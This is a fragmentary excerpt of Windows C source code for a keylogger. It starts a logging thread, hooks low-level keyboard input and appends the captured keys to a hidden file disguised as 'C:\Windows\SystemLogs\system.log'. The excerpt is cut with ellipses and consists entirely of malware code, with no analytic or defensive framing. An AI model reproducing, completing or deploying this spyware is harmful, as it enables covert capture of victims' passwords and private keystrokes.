...
int StartKeyLogging() {
	HANDLE hThread;
	DWORD dwThread;
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keyloggerThread, NULL, 0, NULL);
	if (hThread)
	{
...
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	...
	HANDLE hDevice = CreateFileW(
		L"C:\\Windows\\SystemLogs\\system.log", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, 0);
	CloseHandle(hDevice);
	FILE* file;
	file = fopen("C:\\Windows\\SystemLogs\\system.log", "a+");
